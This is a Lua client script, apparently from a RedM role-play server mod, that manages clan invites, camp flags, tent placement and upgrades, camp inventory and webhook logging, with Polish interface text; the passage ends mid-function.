RegisterCommand('unfuck', function(source, args, rawCommand)
    SetNuiFocus(false,false)
end, false)




RegisterNetEvent("syn:playerlistname")
AddEventHandler("syn:playerlistname", function(clanmembers)
    playeridinclan = clanmembers
end)

RegisterNetEvent("syn:listoutfits")
AddEventHandler("syn:listoutfits", function(playeroutfits)
    poutifts = playeroutfits
end)
RegisterNetEvent("syn:getskins")
AddEventHandler("syn:getskins", function(skin)
    playerskin = skin
end)


RegisterNetEvent("syn:inviteplayer2")
AddEventHandler("syn:inviteplayer2", function(invitedclanid)
   local invited = invitedclanid
    
    TriggerServerEvent("syn:inviteplayers",count2, id, clanid2, clancount, clanname, invited)                    
end)
RegisterNetEvent("syn:newleader2")
AddEventHandler("syn:newleader2", function(newleaderclanid)
    
    TriggerServerEvent("syn:updateleader", newleader, clanid2, clanname, newleaderclanid)                    
end)
-------CLAN CREATION END-----------


-------CAMP CREATION START-----------
RegisterNetEvent('syn:flag')
AddEventHandler('syn:flag', function()

    if flag ~= 0 then
        SetEntityAsMissionEntity(flag)
        DeleteObject(flag)
        flag = 0
    end
    local playerPed = PlayerPedId()
    TaskStartScenarioInPlace(playerPed, GetHashKey('WORLD_HUMAN_WRITE_NOTEBOOK'), 30000, true, false, false, false)
    exports['progressBars']:startUI(30000, "Umieszczasz flagÄ™ klanu ...")
    Citizen.Wait(30000)
    ClearPedTasks(PlayerPedId())
    local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
    proping = CreateObject(-229587575, x, y, z, true, false, true)
    SetEntityHeading(proping, GetEntityHeading(PlayerPedId()))
    PlaceObjectOnGroundProperly(proping)
    FreezeEntityPosition( proping, true)

    flag = proping

end)


RegisterNetEvent("syn:loadcamp")
AddEventHandler("syn:loadcamp", function(registered,tent1, tent2, tent3, tent4, tent5, fire, hitch1, hitch2, table, inventory, chair1, chair2, chair3, chair4, chair5, barrel, destiller, tanner, stews, cart, ledger, webhook, playerscamp, material, stock, exp, level, stewq)
    local _source = source
    campregistered = registered
    hastent1z = tent1
    hastent2z = tent2
    hastent3z = tent3
    hastent4z = tent4
    hastent5z = tent5
    campfirez = fire
    hitch1z = hitch1
    hitch2z = hitch2
    tablez = table
    inventoryz = inventory
    stewz = stews
    chair1z = chair1
    chair2z = chair2
    chair3z = chair3
    chair4z = chair4
    chair5z = chair5
    barrelz = barrel
    destillerz = destiller
    tannerz = tanner
    cartz = cart
    cash = ledger
    web = webhook
    campflagofplayer = playerscamp
    materialz = material
    stockz = stock
    xp = exp
    lev = level
    qtstew = stewq

    if campflagofplayer == 0 then
    else
    flg = json.decode(campflagofplayer)
    end

    if inventoryz == 0 then
    else
    inv = json.decode(inventoryz)
    end
    if stewz == 0 then
    else
    food = json.decode(stewz)
    end

    if tannerz == 0 then
    else
    butcher = json.decode(tannerz)
    end

    if hastent1z == 0 then
    else
    tent1y = json.decode(hastent1z)
    end
    if hastent2z == 0 then
    else
    tent2y = json.decode(hastent2z)
    end
    if hastent3z == 0 then
    else
    tent3y = json.decode(hastent3z)
    end    
    if  hastent4z == 0 then
    else
    tent4y = json.decode(hastent4z)
    end   
    if hastent5z == 0 then
    else
    tent5y = json.decode(hastent5z)
    end
    if campregistered == 0 then 
        campregistered2 = 0
    else
        campregistered2 = 1
    end
end)


RegisterNetEvent('syn:registercamploc')
AddEventHandler('syn:registercamploc', function(camploc)
    local playerPed = PlayerPedId()
    local _source = source
    local tooClose = {}
    local loca = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.0)
    local vec = #(loca)
    local heading = GetEntityHeading(PlayerPedId())
    local loc = {x=loca.x, y=loca.y, z=loca.z, h=heading}
        if camploc == 0 then 
            TriggerServerEvent("syn:registercamplocation",loc, clanid2, vec)
        else
            for i = 1,#camploc do
               local distance = vec-camploc[i]
                if distance < -1 then 
                    distance = -(distance)
                    if distance < 100 then
                    tooClose[i] = 1
                    else
                    tooClose[i] = 0
                    end
                else
                    if distance < 100 then
                    tooClose[i] = 1
                    else
                    tooClose[i] = 0
                    end
                end 
            end
          local value = 1
            for i = 1,#tooClose do
                value = value * tooClose[i]
            end
            if value == 1 then
                TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                exports['progressBars']:startUI(10000, "Przepakowywanie twojej flagi ...")
                Citizen.Wait(10000)
                TriggerServerEvent("syn:warn")
                if flag == 0 then
                elseif flag == proping then
                       SetEntityAsMissionEntity(flag)
                       DeleteObject(flag)
                       flag = 0
                       TriggerServerEvent('syn:additem1', "flag")
                   end
                   Citizen.Wait(10000)
                   ClearPedTasks(PlayerPedId())
            elseif value == 0 then
                TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_WRITE_NOTEBOOK'), 30000, true, false, false, false)
                exports['progressBars']:startUI(10000, "Rejestrujesz lokalizacjÄ™ swojego obozu ...")
                TriggerServerEvent("syn:registercamplocation", loc, clanid2, vec)
                Citizen.Wait(10000)
                TriggerServerEvent("syn:camp",clanid2)
                ClearPedTasks(PlayerPedId())

            end
        end
end)



RegisterNetEvent("vorp:SelectedCharacter")
AddEventHandler("vorp:SelectedCharacter", function(charid)
    TriggerServerEvent('syn:getclan')
    Citizen.Wait(2000)
    TriggerServerEvent("syn:getclanid")
    Citizen.Wait(2000)
    TriggerServerEvent("syn:getcamp",clanid2)
    TriggerServerEvent("syn:camp",clanid2)
end)



RegisterNetEvent("syn:loadblip") 
AddEventHandler("syn:loadblip", function()
    Citizen.Wait(1000)
    TriggerServerEvent('syn:getclan')
    Citizen.Wait(1000)
    TriggerServerEvent("syn:getclanid")
    Citizen.Wait(1000)
    TriggerServerEvent("syn:camp",clanid2)


end)



RegisterNetEvent("syn:blip")
AddEventHandler("syn:blip", function(blipinfo)
    local _source = source
     campdetails = blipinfo

     if campdetails == 0 then 
     else
        local campblip = json.decode(campdetails)
         blip = N_0x554d9d53f696d002(1664425300, campblip.x, campblip.y, campblip.z)
         if blip == 0 then
         else
            SetBlipSprite(blip, 90287351, 1)
            SetBlipScale(blip, 0.4)
            Citizen.InvokeNative(0x9CB1A1623062F402, blip, ""..clanname.." ObĂłz")
         end
     end
end)



Citizen.CreateThread(function() -- coords based functions (inventory, clothing)
    while true do 
        Citizen.Wait(0)
        local player = PlayerPedId()
        local coords = GetEntityCoords(player)
        local sleep = true
        
            
            if IsPedOnFoot(player) then
                if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tent1y.x, tent1y.y, tent1y.z, false) < 3  
                or GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tent2y.x, tent2y.y, tent2y.z, false) < 3 
                or GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tent3y.x, tent3y.y, tent3y.z, false) < 3 
                or GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tent4y.x, tent4y.y, tent4y.z, false) < 3 
                or GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tent5y.x, tent5y.y, tent5y.z, false) < 3  then
                    sleep = false
                    DrawTxt("NaciĹ›nij [~e~G~q~] aby otworzyÄ‡ Menu namiotowe", 0.50, 0.95, 0.7, 0.5, true, 255, 255, 255, 255, true)
                    if whenKeyJustPressed(Config.keys.three) then
                        TriggerServerEvent("syn:getoutfits")
                        TriggerServerEvent("syn:getskin")
                        Citizen.Wait(700)
                        WarMenu.OpenMenu('wardrobe')
                    end
                end
                if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, inv.x, inv.y, inv.z, false) < 2 then ---- inventory system
                    sleep = false
                    DrawTxt("NaciĹ›nij [~e~G~q~] aby otworzyÄ‡ Ekwipunek", 0.50, 0.95, 0.7, 0.5, true, 255, 255, 255, 255, true)

                    if whenKeyJustPressed(Config.keys.three) then
                        local closestPlayer, closestDistance = GetClosestPlayer()
                         if closestPlayer ~= -1 and closestDistance <= 2.0 then
                            TriggerEvent("syn:warndistance2")
                        else
                            TriggerServerEvent("syn:sendid", clanid2)
                            TriggerServerEvent("syn:reloadCampInventory", clanid2)
                            local clanid = clanid2
                            TriggerEvent("vorp_inventory:OpenClanInventory", "Camp Storage", clanid)
                            if web ~= 0 then 
                                TriggerServerEvent('syn:getname')
                                Citizen.Wait(500)
                                TriggerServerEvent('syn:getgeninfo', web,  playernamez, clanname)
                            end
                        end
                    end
                end
                if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, butcher.x, butcher.y, butcher.z, false) < 4 then
                    sleep = false
                    DrawTxt("NaciĹ›nij [~e~G~q~] aby otworzyÄ‡ Menu rzeĹşnika", 0.50, 0.95, 0.7, 0.5, true, 255, 255, 255, 255, true)
                    if whenKeyJustPressed(Config.keys.three) then
                        TriggerServerEvent('syn:getclan')
                        TriggerServerEvent("syn:getclanid")
                        Citizen.Wait(400)
                        TriggerServerEvent("syn:getcamp",clanid2)
                        Citizen.Wait(400)
                      WarMenu.OpenMenu('butcher')
                    end
                end
                if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, food.x, food.y, food.z, false) < 2 then
                    sleep = false
                    DrawTxt("NaciĹ›nij [~e~G~q~] aby zrobiÄ‡ gulasz", 0.50, 0.95, 0.7, 0.5, true, 255, 255, 255, 255, true)
                    if whenKeyJustPressed(Config.keys.three) then
                        TriggerServerEvent('syn:getclan')
                        TriggerServerEvent("syn:getclanid")
                        Citizen.Wait(400)
                        TriggerServerEvent("syn:getcamp",clanid2)
                        Citizen.Wait(400)
                      WarMenu.OpenMenu('stew')
                    end
                end
                if spawncart == true then
                    sleep = false
                    if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, butcher.x, butcher.y, butcher.z, false) < 40 then
                        TriggerEvent("vorp:TipBottom", "NaciĹ›nij [~e~G~q~] aby wyciÄ…gnÄ…Ä‡ PowĂłz", 2000)
                        if whenKeyJustPressed(Config.keys.three) then
                            local ped = PlayerPedId()
                            local car_start = GetEntityCoords(ped)
                            local car_name = Config.Carthash.Hunting
                            local carHash = GetHashKey(car_name)
                            RequestModel(carHash)
                        
                            while not HasModelLoaded(carHash) do
                                Citizen.Wait(0)
                            end
                        
                            local car = CreateVehicle(carHash, car_start.x + 3, car_start.y + 3, car_start.z, GetEntityHeading(PlayerPedId()), true, false)
                            SetVehicleOnGroundProperly(car)
                            Wait(200)
                            SetPedIntoVehicle(ped, car, -1)
                            SetModelAsNoLongerNeeded(carHash)                        
                            spawncart = false
                        end
                    else
                        TriggerEvent("vorp:TipBottom", "JesteĹ› zbyt daleko", 2000)
                        spawncart = false
                    end
                end
                if sleep then 
                    Citizen.Wait(1000)
                end

            end
     
    end
end) 


Citizen.CreateThread(function() -- get distance from flag
    while true do 
        Citizen.Wait(0)
        local player = PlayerPedId()
        local coords = GetEntityCoords(player)  
        if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, flg.x, flg.y, flg.z, false) < 2 then
            inrange = true
        else
            inrange = false
        end
    end
end) 


function GetClosestPlayer()
    local players, closestDistance, closestPlayer = GetActivePlayers(), -1, -1
    local playerPed, playerId = PlayerPedId(), PlayerId()
    local coords, usePlayerPed = coords, false
    
    if coords then
        coords = vector3(coords.x, coords.y, coords.z)
    else
        usePlayerPed = true
        coords = GetEntityCoords(playerPed)
    end
    
    for i=1, #players, 1 do
        local tgt = GetPlayerPed(players[i])

        if not usePlayerPed or (usePlayerPed and players[i] ~= playerId) then

            local targetCoords = GetEntityCoords(tgt)
            local distance = #(coords - targetCoords)

            if closestDistance == -1 or closestDistance > distance then
                closestPlayer = players[i]
                closestDistance = distance
            end
        end
    end
    return closestPlayer, closestDistance
end



Citizen.CreateThread(function() --move props upgrade props
    while true do 
        Citizen.Wait(1)
        local sleep = true
        if upgradespot == 0 then
        else
            sleep = false
            local tables = json.decode(upgradespot)
            local canplace = 0
            local player = PlayerPedId()
            local coords = GetEntityCoords(player)
            local tenttype = 0
            if slot == 1 then
                local tent1x = json.decode(hastent1z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)
                if model == 1 then  -- 
                    tenttype = 1547494109
                elseif model == 2 then  -- 
                    tenttype = -982904156
                elseif model == 3 then --  
                    tenttype = 1542239325
                elseif model == 4 then -- 
                    tenttype = -1228001529
                elseif model == 5 then --   
                     tenttype = -749258641
                elseif model == 6 then  -- 
                     tenttype = -274241402               
                end
                if whenKeyJustPressed(Config.keys.three) then
                        upgradespot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)        
                    if betweencoords < 40 then                       
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())   
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))   
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)  
                        FreezeEntityPosition( tent1, true)
                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        local equip = slot
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.upgradetent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if slot == 2 then
                local tent1x = json.decode(hastent2z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)
                local tenttype = 0
                if model == 1 then  -- 
                    tenttype = 1547494109
                elseif model == 2 then  -- 
                    tenttype = -982904156
                elseif model == 3 then --  
                    tenttype = 1542239325
                elseif model == 4 then -- 
                    tenttype = -1228001529
                elseif model == 5 then --   
                     tenttype = -749258641
                elseif model == 6 then  -- 
                     tenttype = -274241402               
                end
                if whenKeyJustPressed(Config.keys.three) then
                        upgradespot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)        
                    if betweencoords < 40 then                       
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())   
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))   
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)

                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        local equip = slot
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.upgradetent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if slot == 3 then
                local tent1x = json.decode(hastent3z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)
                local tenttype = 0
                if model == 1 then  -- 
                    tenttype = 1547494109
                elseif model == 2 then  -- 
                    tenttype = -982904156
                elseif model == 3 then --  
                    tenttype = 1542239325
                elseif model == 4 then -- 
                    tenttype = -1228001529
                elseif model == 5 then --   
                     tenttype = -749258641
                elseif model == 6 then  -- 
                     tenttype = -274241402               
                end
                if whenKeyJustPressed(Config.keys.three) then
                        upgradespot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)        
                    if betweencoords < 40 then                       
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())   
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))   
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)

                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        local equip = slot
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.upgradetent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if slot == 4 then
                local tent1x = json.decode(hastent4z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)
                local tenttype = 0
                if model == 1 then  -- 
                    tenttype = 1547494109
                elseif model == 2 then  -- 
                    tenttype = -982904156
                elseif model == 3 then --  
                    tenttype = 1542239325
                elseif model == 4 then -- 
                    tenttype = -1228001529
                elseif model == 5 then --   
                     tenttype = -749258641
                elseif model == 6 then  -- 
                     tenttype = -274241402               
                end
                if whenKeyJustPressed(Config.keys.three) then
                        upgradespot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)        
                    if betweencoords < 40 then                       
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())   
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))   
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)

                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        local equip = slot
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.upgradetent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if slot == 5 then
                local tent1x = json.decode(hastent5z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)
                local tenttype = 0
                if model == 1 then  -- 
                    tenttype = 1547494109
                elseif model == 2 then  -- 
                    tenttype = -982904156
                elseif model == 3 then --  
                    tenttype = 1542239325
                elseif model == 4 then -- 
                    tenttype = -1228001529
                elseif model == 5 then --   
                     tenttype = -749258641
                elseif model == 6 then  -- 
                     tenttype = -274241402               
                end
                if whenKeyJustPressed(Config.keys.three) then
                        upgradespot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)        
                    if betweencoords < 40 then                       
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())   
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))   
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1) 
                        FreezeEntityPosition( tent1, true)
  
                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        local equip = slot
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.upgradetent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end 
        end
        if sleep then 
            Citizen.Wait(1000)
        end

    end
end)

Citizen.CreateThread(function() --move props move props
    while true do 
        Citizen.Wait(1)
        local sleep = true
        if campspot == 0 then
        else
            sleep = false
            local tables = json.decode(campspot)
            local canplace = 0
            local player = PlayerPedId()
            local coords = GetEntityCoords(player)
            if equip == 1 then                   
                local tent1x = json.decode(hastent1z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                        campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)        
                    if betweencoords < 40 then                       
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())   
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))   
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)   
                        FreezeEntityPosition( tent1, true)

                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                        TriggerServerEvent("syn:getclanid")
                        Citizen.Wait(1000)
                        TriggerServerEvent("syn:getcamp",clanid2)    
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            
            if equip == 2 then
                local tent1x = json.decode(hastent2z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)    
                        FreezeEntityPosition( tent1, true)
           
                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 3 then
                local tent1x = json.decode(hastent3z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)  
                        FreezeEntityPosition( tent1, true)
             
                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 4 then
                local tent1x = json.decode(hastent4z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)  
                        FreezeEntityPosition( tent1, true)
             
                        local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                        TriggerServerEvent("syn:savenewequipment", tent, equip, clanid2)
                        TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2)
                    else
                        TriggerEvent("syn:warndistance")
                    end
                end
            end
            if equip == 5 then
                local tent1x = json.decode(hastent5z)
                local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                SetEntityAsMissionEntity(object1)
                DeleteObject(object1)    
                local tenttype = tent1x.m
                if whenKeyJustPressed(Config.keys.three) then
                    campspot = 0
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)              
                    if betweencoords < 40 then                      
                        TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                        exports['progressBars']:startUI(10000, "Stawianie Namiotu...")
                        Citizen.Wait(10000)
                        ClearPedTasks(PlayerPedId())              
                        local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))               
                        local heading = GetEntityHeading(PlayerPedId())
                        local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                        SetEntityHeading(tent1, heading)
                        PlaceObjectOnGroundProperly(tent1)
                        SetEntityAsMissionEntity(tent1)     
                        FreezeEntityPosition( tent1, true)
          
